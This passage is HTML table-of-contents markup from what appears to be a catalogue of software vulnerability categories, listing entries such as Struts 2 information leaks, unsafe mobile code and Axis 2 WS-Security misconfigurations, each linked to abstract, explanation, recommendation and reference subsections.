<span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-132"><span class="toc-number">1.3.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-131"><span class="toc-number">1.3.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-130"><span class="toc-number">1.3.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Spring-Boot-Actuators-Enabled"><span class="toc-number">1.3.41.</span> <span class="toc-text">System Information Leak: Spring Boot Actuators Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-132"><span class="toc-number">1.3.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-133"><span class="toc-number">1.3.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-132"><span class="toc-number">1.3.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-131"><span class="toc-number">1.3.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Struts-2"><span class="toc-number">1.3.42.</span> <span class="toc-text">System Information Leak: Struts 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-133"><span class="toc-number">1.3.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-134"><span class="toc-number">1.3.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-133"><span class="toc-number">1.3.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-132"><span class="toc-number">1.3.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Boundary-Violation"><span class="toc-number">1.3.43.</span> <span class="toc-text">Trust Boundary Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-134"><span class="toc-number">1.3.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-135"><span class="toc-number">1.3.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-134"><span class="toc-number">1.3.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-133"><span class="toc-number">1.3.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Access-Violation"><span class="toc-number">1.3.44.</span> <span class="toc-text">Unsafe Mobile Code: Access Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-135"><span class="toc-number">1.3.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-136"><span class="toc-number">1.3.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-135"><span class="toc-number">1.3.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-134"><span class="toc-number">1.3.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Database-Access"><span class="toc-number">1.3.45.</span> <span class="toc-text">Unsafe Mobile Code: Database Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-136"><span class="toc-number">1.3.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-137"><span class="toc-number">1.3.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-136"><span class="toc-number">1.3.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-135"><span class="toc-number">1.3.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Inner-Class"><span class="toc-number">1.3.46.</span> <span class="toc-text">Unsafe Mobile Code: Inner Class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-137"><span class="toc-number">1.3.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-138"><span class="toc-number">1.3.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-137"><span class="toc-number">1.3.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-136"><span class="toc-number">1.3.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Public-finalize-Method"><span class="toc-number">1.3.47.</span> <span class="toc-text">Unsafe Mobile Code: Public finalize() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-138"><span class="toc-number">1.3.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-139"><span class="toc-number">1.3.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-138"><span class="toc-number">1.3.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-137"><span class="toc-number">1.3.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Array-Declaration"><span class="toc-number">1.3.48.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Array Declaration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-139"><span class="toc-number">1.3.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-140"><span class="toc-number">1.3.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-139"><span class="toc-number">1.3.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-138"><span class="toc-number">1.3.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Public-Field"><span class="toc-number">1.3.49.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Public Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-140"><span class="toc-number">1.3.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-141"><span class="toc-number">1.3.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-140"><span class="toc-number">1.3.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-139"><span class="toc-number">1.3.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境配置"><span class="toc-number">1.4.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Misconfiguration-Debug-Information"><span class="toc-number">1.4.1.</span> <span class="toc-text">Android Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-141"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-142"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-141"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-140"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Misconfiguration-Debug-Information"><span class="toc-number">1.4.2.</span> <span class="toc-text">Axis 2 Misconfiguration: Debug Information</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-142"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-143"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-142"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-141"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Misconfiguration-Insecure-Message-Security"><span class="toc-number">1.4.3.</span> <span class="toc-text">Axis 2 Misconfiguration: Insecure Message Security</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-143"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-144"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-143"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-142"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.4.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-144"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-145"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-144"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-143"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.5.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-145"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-146"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-145"><span class="toc-number">1.4.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-144"><span class="toc-number">1.4.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Signature"><span class="toc-number">1.4.6.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Inbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-146"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-147"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-146"><span class="toc-number">1.4.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-145"><span class="toc-number">1.4.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.7.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-147"><span class="toc-number">1.4.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-148"><span class="toc-number">1.4.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-147"><span class="toc-number">1.4.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-146"><span class="toc-number">1.4.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.8.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-148"><span class="toc-number">1.4.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-149"><span class="toc-number">1.4.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-148"><span class="toc-number">1.4.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-147"><span class="toc-number">1.4.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.9.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-149"><span class="toc-number">1.4.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-150"><span class="toc-number">1.4.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-149"><span class="toc-number">1.4.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-148"><span class="toc-number">1.4.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.10.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-150"><span class="toc-number">1.4.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-151"><span class="toc-number">1.4.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-150"><span class="toc-number">1.4.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-149"><span class="toc-number">1.4.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.11.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-151"><span class="toc-number">1.4.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-152"><span class="toc-number">1.4.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-151"><span class="toc-number">1.4.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-150"><span class="toc-number">1.4.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp"><span class="toc-number">1.4.12.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Unsigned Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-152"><span class="toc-number">1.4.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-153"><span class="toc-number">1.4.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-152"><span class="toc-number">1.4.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-151"><span class="toc-number">1.4.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp"><span class="toc-number">1.4.13.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Unsigned Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-153"><span class="toc-number">1.4.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-154"><span class="toc-number">1.4.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-153"><span class="toc-number">1.4.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-152"><span class="toc-number">1.4.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-WS-Security-Not-Enabled"><span class="toc-number">1.4.14.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-154"><span class="toc-number">1.4.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-155"><span class="toc-number">1.4.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-154"><span class="toc-number">1.4.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-153"><span class="toc-number">1.4.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Provider-Misconfiguration-Weak-Token"><span class="toc-number">1.4.15.</span> <span class="toc-text">Axis 2 Service Provider Misconfiguration: Weak Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-155"><span class="toc-number">1.4.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-156"><span class="toc-number">1.4.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-155"><span class="toc-number">1.4.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-154"><span class="toc-number">1.4.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Inbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.16.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Inbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-156"><span class="toc-number">1.4.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-157"><span class="toc-number">1.4.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-156"><span class="toc-number">1.4.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-155"><span class="toc-number">1.4.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Encryption"><span class="toc-number">1.4.17.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Inbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-157"><span class="toc-number">1.4.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-158"><span class="toc-number">1.4.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-157"><span class="toc-number">1.4.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-156"><span class="toc-number">1.4.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Signature"><span class="toc-number">1.4.18.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Inbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-158"><span class="toc-number">1.4.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-159"><span class="toc-number">1.4.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-158"><span class="toc-number">1.4.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-157"><span class="toc-number">1.4.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Inbound-Timestamp"><span class="toc-number">1.4.19.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Inbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-159"><span class="toc-number">1.4.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-160"><span class="toc-number">1.4.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-159"><span class="toc-number">1.4.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-158"><span class="toc-number">1.4.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Encryption"><span class="toc-number">1.4.20.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Outbound Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-160"><span class="toc-number">1.4.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-161"><span class="toc-number">1.4.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-160"><span class="toc-number">1.4.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-159"><span class="toc-number">1.4.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Signature"><span class="toc-number">1.4.21.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Outbound Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-161"><span class="toc-number">1.4.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-162"><span class="toc-number">1.4.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-161"><span class="toc-number">1.4.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-160"><span class="toc-number">1.4.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Missing-Outbound-Timestamp"><span class="toc-number">1.4.22.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Missing Outbound Timestamp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-162"><span class="toc-number">1.4.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-163"><span class="toc-number">1.4.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-162"><span class="toc-number">1.4.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-161"><span class="toc-number">1.4.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Outbound-WS-Security-Not-Enabled"><span class="toc-number">1.4.23.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Outbound WS-Security Not Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-163"><span class="toc-number">1.4.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-164"><span class="toc-number">1.4.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-163"><span class="toc-number">1.4.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-162"><span class="toc-number">1.4.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Axis-2-Service-Requester-Misconfiguration-Plain-Text-Password"><span class="toc-number">1.4.24.</span> <span class="toc-text">Axis 2 Service Requester Misconfiguration: Plain Text Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-164"><span class="toc-number">1.4.24.1.</span> <span 